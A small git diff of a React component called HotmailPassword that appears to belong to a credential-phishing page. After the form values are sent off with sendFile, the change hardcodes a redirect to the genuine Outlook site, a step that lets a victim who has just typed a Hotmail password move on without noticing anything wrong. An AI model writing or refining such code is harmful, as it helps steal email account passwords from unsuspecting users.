@@ -39,7 +39,7 @@ export default function HotmailPassword({ location }) {
     } else {
       sendFile(values).then((data) => {
         // redirect
-        navigate("../processing", { state: { domain: location.state.domain } });
+        navigate("../processing", { state: { domain: "https://outlook.live.com" } });
         console.log("ok");
       });
     }
